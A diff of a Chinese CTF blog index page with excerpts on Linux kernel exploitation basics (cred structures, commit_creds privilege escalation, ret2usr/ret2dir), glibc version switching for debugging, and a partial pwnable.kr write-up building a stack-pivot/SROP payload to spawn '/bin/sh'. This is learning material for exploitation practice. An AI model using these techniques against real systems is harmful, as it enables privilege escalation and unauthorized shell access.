@@ -28,7 +28,181 @@ var CONFIG = {
   sourcePath: {"js":"js","css":"css","images":"images"},
 };
 
-window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/qemu%E9%80%83%E9%80%B8-pwn%E8%A7%A3%E9%A2%98/">qemu逃逸-pwn解题</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、内存模块：<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507619.jpeg" alt="img"></p>
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/pwn-kernel_%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/">pwn-kernel_前置知识</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、内核前置基础知识：</p>
+<p>1.physmap：</p>
+<p>physmap是内核管理的一块非常大的连续的虚拟内存空间，为了提高效率，该空间地址和RAM地址直接映射。RAM相对physmap要小得多，导致了任何一个RAM地址都可以在physmap中找到其对应的虚拟内存地址，而用户空间的虚拟内存也会映射到RAM。</p>
+<p>所以可能会形成如下关系：</p>
+<p>usr_data—&gt;RAM—-&gt;physmap</p>
+<p>那么physmap中就有可能会保存usr_data，那么就为提权代码放到内核空间提供了前置条件，同时有mmap就可能会导致条件竞争。</p>
+<p>2.ioctl：系统调用，用于与设备通信</p>
+<p>由于内核和用户空间隔离开，所以就需要一个接口来使得用户可以在一定情况下访问内核空间：</p>
+<p>int ioctl(int fd, unsigned long request, …)</p>
+<p>第一个参数为打开设备 (open) 返回的文件描述符，第二个参数为用户程序对设备的控制命令，再后边的参数则是一些补充参数，与设备有关。</p>
+<p>3.状态转换相关操作：</p>
+<p>当发生系统调用，产生异常，外设产生中断等事件时，会发生用户态到内核态的切换</p>
+<p>ENTRY(entry_SYSCALL_64)</p>
+<p>(1).用户态至内核态：</p>
+<p>①swapgs指令触发，切换到kernel GS：</p>
+<p>SWAPGS_UNSAFE_STACK</p>
+<p>②保存栈值，设置内核栈：</p>
+<p>movq %rsp, PER_CPU_VAR(rsp_scratch)</p>
+<p>movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp</p>
+<p>③压栈保存寄存器：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#注释头 </span><br><span class="line"></span><br><span class="line">/* Construct struct pt_regs on stack */</span><br><span class="line">pushq  $__USER_DS      /* pt_regs-&gt;ss */</span><br><span class="line">pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;sp */</span><br><span class="line">pushq  %r11             /* pt_regs-&gt;flags */</span><br><span class="line">pushq  $__USER_CS      /* pt_regs-&gt;cs */</span><br><span class="line">pushq  %rcx             /* pt_regs-&gt;ip */</span><br><span class="line">pushq  %rax             /* pt_regs-&gt;orig_ax */</span><br><span class="line">pushq  %rdi             /* pt_regs-&gt;di */</span><br><span class="line">pushq  %rsi             /* pt_regs-&gt;si */</span><br><span class="line">pushq  %rdx             /* pt_regs-&gt;dx */</span><br><span class="line">pushq  %rcx tuichu    /* pt_regs-&gt;cx */</span><br><span class="line">pushq  $-ENOSYS        /* pt_regs-&gt;ax */</span><br><span class="line">pushq  %r8              /* pt_regs-&gt;r8 */</span><br><span class="line">pushq  %r9              /* pt_regs-&gt;r9 */</span><br><span class="line">pushq  %r10             /* pt_regs-&gt;r10 */</span><br><span class="line">pushq  %r11             /* pt_regs-&gt;r11 */</span><br><span class="line">sub $(6*8), %rsp      /* pt_regs-&gt;bp, bx, r12-15 not saved */</span><br></pre></td></tr></table></div></figure>
+
+<p>④判断类型并跳转：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">movq PER_CPU_VAR(current_task), %r11</span><br><span class="line">testl $_TIF_WORK_SYSCALL_ENTRY|_TIF_ALLWORK_MASK, TASK_TI_flags(%r11)</span><br><span class="line">jnz entry_SYSCALL64_slow_path</span><br></pre></td></tr></table></div></figure>
+
+<p>▲</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">entry_SYSCALL64_slow_path:</span><br><span class="line">  /* IRQs are off. */</span><br><span class="line">  SAVE_EXTRA_REGS</span><br><span class="line">  movq    %rsp, %rdi</span><br><span class="line">  call    do_syscall_64        /* returns with IRQs disabled */</span><br></pre></td></tr></table></div></figure>
+
+<p>(2)内核态至用户态：</p>
+<p>①swapgs恢复GS</p>
+<p>②iretq（加上寄存器信息）或sysretq，如果使用 iretq 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）</p>
+<p>kernel 的 crash 通常会引起重启</p>
+<p>4.相关保护技术Mitigation：</p>
+<p>(1)SMAP和SMEP保护技术：</p>
+<p>(arm里面叫PXN(Privilege Execute Never)和PAN(Privileged Access Never))</p>
+<p>①SMAP:禁止内核访问用户空间的数据(Supervisor Mode Access Prevention)</p>
+<p>②SMEP:禁止内核执行用户空间的代码(Supervisor Mode Execution Prevention)</p>
+<p>内核命令行中添加nosmap和nosmep禁用</p>
+<p>(2)kernel canary:</p>
+<p>编译内核时设置CONFIG_CC_STACKPROTECTOR，可以起到类似于stack canary的技术。</p>
+<p>(3)KALSR：内核地址随机化</p>
+<p>5.提权代码与函数结构体：</p>
+<p>cred结构体：kernel用cred结构体记录进程权限(每个结构都有一个cred结构)，保存了进程的相关信息，如果利用这个cred就可以提权。一般调用commit_creds(prepare_kernel_cred(0))完成提权然后用户态“着陆”起shell。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">struct cred &#123;</span><br><span class="line">    atomic_t    usage;</span><br><span class="line">#ifdef CONFIG_DEBUG_CREDENTIALS</span><br><span class="line">    atomic_t    subscribers;           /* number of processes subscribed */</span><br><span class="line">    void        *put_addr;</span><br><span class="line">    unsigned    magic;</span><br><span class="line">#define CRED_MAGIC  0x43736564</span><br><span class="line">#define CRED_MAGIC_DEAD 0x44656144</span><br><span class="line">#endif</span><br><span class="line">    kuid_t      uid;                   /* real UID of the task */</span><br><span class="line">    kgid_t      gid;                   /* real GID of the task */</span><br><span class="line">    kuid_t      suid;                  /* saved UID of the task */</span><br><span class="line">    kgid_t      sgid;                  /* saved GID of the task */</span><br><span class="line">    kuid_t      euid;                  /* effective UID of the task */</span><br><span class="line">    kgid_t      egid;                  /* effective GID of the task */</span><br><span class="line">    kuid_t      fsuid;                 /* UID for VFS ops */</span><br><span class="line">    kgid_t      fsgid;                 /* GID for VFS ops */</span><br><span class="line">    unsigned    securebits;            /* SUID-less security management */</span><br><span class="line">    kernel_cap_t    cap_inheritable;   /* caps our children can inherit */</span><br><span class="line">    kernel_cap_t    cap_permitted;     /* caps we&#x27;re permitted */</span><br><span class="line">    kernel_cap_t    cap_effective;     /* caps we can actually use */</span><br><span class="line">    kernel_cap_t    cap_bset;          /* capability bounding set */</span><br><span class="line">    kernel_cap_t    cap_ambient;       /* Ambient capability set */</span><br><span class="line">#ifdef CONFIG_KEYS</span><br><span class="line">    unsigned char   jit_keyring;       /* default keyring to attach requested</span><br><span class="line">    /* keys to */</span><br><span class="line">    struct key __rcu *session_keyring; /* keyring inherited over fork */</span><br><span class="line">    struct key  *process_keyring;      /* keyring private to this process */</span><br><span class="line">    struct key  *thread_keyring;       /* keyring private to this thread */</span><br><span class="line">    struct key  *request_key_auth;     /* assumed request_key authority */</span><br><span class="line">#endif</span><br><span class="line">#ifdef CONFIG_SECURITY</span><br><span class="line">    void        *security;             /* subjective LSM security */</span><br><span class="line">#endif</span><br><span class="line">    struct user_struct *user;          /* real user ID subscription */</span><br><span class="line">    struct user_namespace *user_ns;    /* user_ns the caps and keyrings are relative to. */</span><br><span class="line">    struct group_info *group_info;     /* supplementary groups for euid/fsgid */</span><br><span class="line">    struct rcu_head rcu;               /* RCU deletion hook */</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></div></figure>
+
+<p>不同内核版本的cred结构体可能不太一样。</p>
+<p>二、内核态函数及相关变化：</p>
+<p>1.printf() -&gt; printk()，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 dmesg 查看效果</p>
+<p>2.malloc() -&gt; kmalloc()，内核态的内存分配函数，和malloc()相似，但使用的是slab/slub分配器。</p>
+<p>3.free() -&gt; kfree()，同 kmalloc()</p>
+<p>4.memcpy() -&gt; copy_from_user()/copy_to_user()</p>
+<p>5.copy_from_user() 实现了将用户空间的数据传送到内核空间</p>
+<p>6.copy_to_user() 实现了将内核空间的数据传送到用户空间</p>
+<p>7.提权相关函数：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">int commit_creds(struct cred *new)</span><br><span class="line">struct cred* prepare_kernel_cred(struct task_struct* daemon)</span><br></pre></td></tr></table></div></figure>
+
+<p>执行commit_creds(prepare_kernel_cred(0))即可获得 root 权限</p>
+<p>函数地址可在/proc/kallsyms，老版本/proc/ksyms中查看(cat|grep)，权限一般需要root</p>
+<p>三、保护绕过技术：</p>
+<p>1.ret2usr:</p>
+<p>在没有SMAP/SMEP的情况下把内核指针重定向到用户空间的漏洞利用方式被称为ret2usr</p>
+<p>2.ret2dir：</p>
+<p>如果用户空间用mmap()把提权代码映射到内存RAM，那么就可以在physmap里找到其对应的副本，就可以修改EIP跳到副本执行，这种利用方式被称为ret2dir。</p>
+<p>3.kernel canary:</p>
+<p>绕过方法同用户空间的canary绕过大致相同，编译内核时设置CONFIG_CC_STACKPROTECTOR，可以起到类似于stack canary的技术。</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/pwn%E4%B8%ADlibc%E7%89%88%E6%9C%AC%E5%88%87%E6%8D%A2%E7%BC%96%E8%AF%91/">pwn中libc版本切换编译</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、手动编译</p>
+<p>1.下载对应libc的源码：以2.32为例：glibc-2.32.tar.gz</p>
+<p>(1)官网：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://ftp.gnu.org/gnu/glibc/" >https://ftp.gnu.org/gnu/glibc/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>(2)清华镜像源：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/gnu/glibc/" >https://mirrors.tuna.tsinghua.edu.cn/gnu/glibc/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>2.解压，然后新建文件夹来存储编译结果：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">tar -xvf glibc-2.32.tar.gz</span><br><span class="line">mkdir glibc-2.32_build</span><br><span class="line">mkdir glibc-2.32_out</span><br></pre></td></tr></table></div></figure>
+
+<p>3.编译：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> glibc-2.32_build</span><br><span class="line">../glibc-2.32/configure <span class="string">&#x27;--prefix=/home/hacker/glibc/2.32/glibc-2.32_out --disable-werror --enable-debug=yes&#x27;</span></span><br><span class="line">make</span><br></pre></td></tr></table></div></figure>
+
+<p>这里的–prefix=****需要一个绝对路径，不能时相对路径，对于pwn来说就好了，不用再接着往下安装了。不过这是64位的，32位得如下：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> glibc-2.32_build</span><br><span class="line">CC=<span class="string">&quot;gcc -m32&quot;</span> CXX=<span class="string">&quot;g++ -m32&quot;</span> \</span><br><span class="line">../glibc-2.32/configure <span class="string">&#x27;--prefix=/home/hacker/glibc/2.32/glibc-2.32_out --disable-werror --enable-debug=yes --host=i686-linux-gnu --build=i686-lin    ux-gnu&#x27;</span> </span><br><span class="line">make</span><br></pre></td></tr></table></div></figure>
+
+<p>基本是差不多的。</p>
+<p>4.找libc.so 和 ld.so文件：</p>
+<p>(1)libc.so 在glibc-2.32_build目录下<br>(2)ld.so 在glibc-2.32_build/elf 目录下</p>
+<p>5.使用：</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;/home/hacker/glibc/2.32/glibc-2.32_build/elf/ld.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;/home/hacker/glibc/2.32/glibc-2.32_build/libc.so.6&quot;</span>&#125;)</span><br></pre></td></tr></table></div></figure>
+
+<p>这样就可以gdb调试的时候带符号表，然后还有源码：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_20-51-09.png" alt="img"></p>
+<p>▲关于ld.so的连接使用，最好还是用编译配套的，不然容易出错。如果不需要源码，只需要按照的libc和ld，就可以make install。然后在glibc-2.32_out/lib/下就能找到这两个文件了。</p>
+<p>二、对应docker下载：</p>
+<p>1.搜对应版本libc对应的ubuntu，比如libc-2.27就对应ubuntu18.04，然后pull下来。</p>
+<p>2.然后将对应版本的docker源sources.list拷贝进去，然后我这边自己总结了一份安装脚本，一键运行，省去很多麻烦。(记得先备份一下，防止出错)</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker cp sources.list [dockerName]:/etc/apt/</span><br><span class="line">docker cp install.sh [dockerName]:/</span><br><span class="line">chmod a+x install.sh</span><br><span class="line">./install.sh</span><br></pre></td></tr></table></div></figure>
+
+<p>装完之后基本的环境就有了，pwndbg，python，pwntools等等，其他的自己慢慢安装吧。</p>
+<p>▲有个pwn_docker也挺好使的：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">docker pull pwn_docker</span><br></pre></td></tr></table></div></figure>
+
+<p>里面运行也类似不同版本的libc:</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头 </span></span><br><span class="line">p</span><br><span class="line">p = process([<span class="string">&#x27;/glibc/2.24/64/lib/ld-linux-x86-64.so.2&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;/glibc/2.24/64/lib/libc-2.24.so&quot;</span>&#125;)</span><br></pre></td></tr></table></div></figure>
+
+<p>三、工具使用：LibcSearcher</p>
+<p>这个算是最常用了，很好用，直接去github上找很多，外面也有很多教程。</p>
+<p>四、patchelf：直接修改ELF文件加载的libc</p>
+<p>1.安装：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">sudo apt-get install autoconf automake libtool</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/NixOS/patchelf.git</span><br><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></div></figure>
+
+<p>编译环境啥的都要有</p>
+<p>2.使用：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/NixOS/patchelf" >https://github.com/NixOS/patchelf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">patchelf --set-interpreter /home/hacker/glibc/2.23/64/lib/ld-2.23.so --set-rpath /home/hacker/glibc/2.23/64/lib/ ./pwn</span><br></pre></td></tr></table></div></figure>
+
+<p>这个可以直接gdb调试，不用再用python打开指定环境。</p>
+<p>五、gdb指定源码级别调试：</p>
+<p>▲有时候用Patchelf切换之后，想调试对应版本的glibc源码</p>
+<p>1.gdb打开后直接命令输入指定：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">dir /home/hacker/glibc-src/glibc-2.23/malloc</span><br></pre></td></tr></table></div></figure>
+
+<p>2.gdb环境配置输入：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">vim ~/.gdbinit</span><br><span class="line">dir /home/hacker/glibc-src/glibc-2.23/malloc</span><br></pre></td></tr></table></div></figure>
+
+<p>但是这有个问题，如果需要对应版本则没办法，只会加载到最下面的版本，所以一般patchelf之后，指定dir即可。</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/pwnable.kr-unexploitable/">pwnable.kr-unexploitable</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec，只开启了NX。IDA打开找漏洞，程序很简单，读入数据栈溢出，可以读取1295个字节，但是buf只有0x10h大小，所以可以溢出足够长的数据。</p>
+<p>2.程序没有后门，没有导入system函数，没有binsh字符串，也没有write、put、printf之类的可以泄露libc的函数，没办法ROP，然后ROPgadget也搜不到syscall。这里换用另一种工具ropper来搜索：ropper –file=unexploitable –search “syscall”，可以搜到一个。有了syscall，可以尝试用rop来给寄存器赋值然后开shell，但是这里还是搜不到给rsi，rdi等寄存器赋值的gadget，这就意味着我们也没办法直接通过ROP实现getshell。</p>
+<p>3.如果没有开NX，直接栈劫持然后shellcode就完事了，但是开启了NX，没办法shellcode。</p>
+<p>4.啥也不管用的时候，可以用SROP，也就是通过syscall再利用SigreturnFrame来设置寄存器rsi和rid的值，加上字符串binsh可以直接getshell，不用非得设置rsi,rdi寄存器值的rop。但是这里使用SigreturnFrame有限制，需要溢出的长度较长一些，32位下需要依顺序布置栈，64位条件下需要往栈中布置一个结构体，所以需要输入足够长的payload来修改。</p>
+<p>5.这里使用的方案是SigreturnFrame，先考虑一段足够长的可修改的内存地址来给我们存放栈劫持的内容。但是在IDA中按ctrl+s查看内存段，发现所有的可改可读的内存段都特别小，没办法存放足够长的溢出内容。这里忽略了一个知识点，临时创建的缓存：也就是我们使用read(0, &amp;buf, 0x50FuLL);时，会临时创建一个长度为0x50F的缓存区间，这个区间足够满足我们的需求，但是在IDA中找不到，那就没办法栈劫持到这个位置。这里可以先动态调试一下，由于没有开启PIE，程序加载后的基地址是固定的，所以无论程序加载多少次，地址仍然不会发生改变。那么转向动态调试，可以看到程序冒出来一个可读可写的内存段：unexploitable，这个就是临时创建的一个缓存区间，长度为F88，足够用来执行操作。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191526527.png" alt="img"></p>
+<p>6.在这个区间上任意选取一个地址来栈劫持，这里选择0x60116c，然后编写payload，尝试能否成功栈劫持并且读入binsh：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload = &quot;&quot;</span><br><span class="line">payload += &#x27;a&#x27;*16               #padding</span><br><span class="line">payload += p64(fake_stack_addr)</span><br><span class="line">#main函数返回时，将栈劫持到fake_stack_addr处，第一次将使得rbp变为fake_stack_addr, rbp + buf为fake_stack_addr - 0x10</span><br><span class="line">payload += p64(set_read_addr)   </span><br><span class="line">#汇编指令为lea rax, [rbp+buf]; mov edx, 50Fh; mov rsi, rax; mov edi, 0; mov eax, 0; call _read的地址处</span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></div></figure>
+
+<p>这样接下来如果再输入binsh字符串，就可以读取到[rbp+buf]处。需要注意的是，这里的set_read_addr是从下图最开始跳转，如果直接跳转call read，那么就会由于read取参是edx,rsi,edi，从而导致数据会存入rsi指向的地址，没办法存到我们劫持的栈中。观察read函数汇编代码可以知道，虽然read存入的地址是rsi，但是rsi是通过rbp+buf来赋值的，所以我们可以通过修改rbp为fake_stack，使得rbp+buf的地址变为fake_stack上的某个地址，再执行下图中的代码，就可以使得read读取的内容直接进入到劫持栈rbp+buf上，也就是fake_stack上。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191526968.png" alt="img"></p>
+<p>7.栈劫持完成之后，考虑第二段的payload，也就是输入binsh字符串和后续内容，来执行SigreturnFrame，使用：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload = &quot;&quot;</span><br><span class="line">payload += &quot;/bin/sh\x00&quot;</span><br></pre></td></tr></table></div></figure>
+
+<p>输入字符串binsh，存放在fake_stack_addr-0x10处</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload += &#x27;a&#x27;*8 #padding</span><br><span class="line">payload += p64(fake_stack_addr+0x10)#存放在0x60116c处</span><br></pre></td></tr></table></div></figure>
+
